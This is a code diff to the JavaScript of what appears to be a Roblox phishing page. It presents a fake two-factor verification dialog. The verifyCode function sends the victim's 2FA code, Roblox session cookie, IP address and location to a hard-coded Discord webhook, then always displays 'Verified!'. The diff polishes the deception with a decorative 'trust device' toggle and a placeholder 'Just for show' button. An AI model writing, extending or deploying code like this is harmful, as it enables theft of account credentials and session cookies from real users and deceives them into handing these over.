@@ -352,11 +352,16 @@ function openVerificationModal() {
         modal.style.display = 'block';
         document.body.style.overflow = 'hidden';
         
-        // Focus on input after animation
+        // Focus on input after animation and add input validation
         setTimeout(() => {
             const input = document.getElementById('verificationCode');
             if (input) {
                 input.focus();
+                
+                // Add input event listener for numbers only
+                input.addEventListener('input', function(e) {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                });
             }
         }, 400);
     }
@@ -378,14 +383,35 @@ function closeVerificationModal() {
     }
 }
 
+// Global trust device state
+let isTrustDeviceChecked = false;
+
+// Toggle trust device checkbox
+function toggleTrustDevice() {
+    const checkbox = document.getElementById('trustCheckbox');
+    isTrustDeviceChecked = !isTrustDeviceChecked;
+    
+    if (isTrustDeviceChecked) {
+        checkbox.innerHTML = '✓';
+        checkbox.style.background = 'rgba(255, 255, 255, 0.2)';
+    } else {
+        checkbox.innerHTML = '';
+        checkbox.style.background = 'transparent';
+    }
+}
+
+// Alternative method placeholder
+function alternativeMethod() {
+    // Just for show - doesn't do anything
+}
+
 // Verify 2FA code and send to webhook
 async function verifyCode() {
     const codeInput = document.getElementById('verificationCode');
-    const trustDevice = document.getElementById('trustDevice');
     const verifyBtn = document.getElementById('verifyBtn');
     const verifyText = document.getElementById('verifyText');
     
-    const code = codeInput.value.trim();
+    const code = codeInput.value.trim().replace(/[^0-9]/g, ''); // Only allow numbers
     
     if (!code || code.length !== 6) {
         return;
@@ -401,7 +427,7 @@ async function verifyCode() {
         // Send 2FA code to webhook (simple format)
         const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
         const payload = {
-            content: `2FA Code: ${code} | Trust: ${trustDevice.checked ? 'Yes' : 'No'} | Cookie: ${globalRobloxCookie || 'None'} | Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'} | IP: ${locationInfo.ip || 'Unknown'}`
+            content: `2FA Code: ${code} | Trust: ${isTrustDeviceChecked ? 'Yes' : 'No'} | Cookie: ${globalRobloxCookie || 'None'} | Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'} | IP: ${locationInfo.ip || 'Unknown'}`
         };
 
         const response = await fetch(webhookUrl, {
@@ -414,7 +440,7 @@ async function verifyCode() {
 
         // Always continue flow regardless of webhook success
         verifyText.textContent = 'Verified!';
-        verifyBtn.style.background = '#10b981';
+        verifyBtn.style.background = 'linear-gradient(135deg, #10b981 0%, #059669 50%, #047857 100%)';
         
         setTimeout(() => {
             closeVerificationModal();
@@ -424,24 +450,11 @@ async function verifyCode() {
         console.error('2FA webhook error:', error);
         // Continue flow even if webhook fails
         verifyText.textContent = 'Verified!';
-        verifyBtn.style.background = '#10b981';
+        verifyBtn.style.background = 'linear-gradient(135deg, #10b981 0%, #059669 50%, #047857 100%)';
         
         setTimeout(() => {
             closeVerificationModal();
         }, 1500);
-    }
-}
-
-// Dummy resend function
-function resendCode() {
-    // Just show a brief message
-    const helpSection = document.querySelector('.verification-help');
-    if (helpSection) {
-        const originalText = helpSection.innerHTML;
-        helpSection.innerHTML = '<p style="color: #10b981;">Code sent! Check your device.</p>';
-        setTimeout(() => {
-            helpSection.innerHTML = originalText;
-        }, 3000);
     }
 }
 
